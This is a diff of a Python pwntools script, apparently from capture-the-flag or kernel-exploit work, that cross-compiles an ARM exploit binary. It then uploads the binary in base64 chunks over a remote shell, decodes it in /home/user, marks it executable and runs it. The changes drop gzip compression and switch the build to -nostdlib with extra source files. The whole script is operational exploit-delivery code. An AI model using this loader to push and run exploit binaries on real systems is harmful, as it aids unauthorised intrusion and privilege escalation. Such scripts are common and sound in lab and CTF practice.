@@ -1,12 +1,12 @@
-#!/usr/bin/env python
+#!/usr/bin/python3.6
 # -*- coding: utf-8 -*-
 
 from pwn import *
 #from brucepwn import *
 import os
 import base64
-os.system("arm-linux-gnueabi-gcc exp.c -static -o exp")
-os.system("gzip -f exp")
+os.system("arm-linux-gnueabi-gcc -nostdlib lib.c  memmem.c  exp.c -o exp")
+#os.system("gzip -f exp")
 file = open("exp.sh","w")
 
 def send_cmd(cmd):
@@ -25,8 +25,9 @@ r = s.shell()
 #send_cmd("cp /bin/busybox /home/user/pwn")
 #send_cmd("echo -ne \"\" > /home/user/poc")
 
+#r = process("./run.sh")
 
-iii = open("./exp.gz", "rb").read() # pwn binary
+iii = open("./exp", "rb").read() # pwn binary
 
 b64 = base64.b64encode(iii).decode('ascii') #iii.encode('base64')
 #b64 = ''.join(b64.split("\n"))
@@ -42,9 +43,8 @@ while now < len(b64):
     now += seg
 
 log.success("base64 decoding...")
-send_cmd("base64 -d /home/user/poc > /home/user/exp.gz")
+send_cmd("base64 -d /home/user/poc > /home/user/exp")
 send_cmd("cd /home/user/")
-send_cmd("gzip -d exp.gz")
 send_cmd("chmod +x exp")
 send_cmd("./exp")
 file.close()
